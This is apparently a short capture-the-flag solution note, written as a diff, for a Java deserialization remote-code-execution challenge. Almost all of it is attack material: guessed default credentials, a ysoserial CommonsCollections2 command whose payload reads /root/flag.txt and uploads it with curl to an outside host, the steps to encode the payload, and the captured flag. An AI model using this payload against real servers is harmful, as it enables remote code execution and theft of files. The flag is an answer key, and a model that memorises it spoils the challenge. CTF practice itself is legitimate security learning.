@@ -1,0 +1,5 @@
+java deserialization rce; login is admin:admin (guess!)
+
+payload: java -jar ysoserial-modified.jar CommonsCollections2 bash 'cat /root/flag.txt | curl -T - http://website' | base64 -w 0 | sed 's/+/%2B/g' | sed 's/=/%3D/g' | xclip -sel clip
+
+CHTB{sw33t_l33t_s3r14lzz_@$#?}
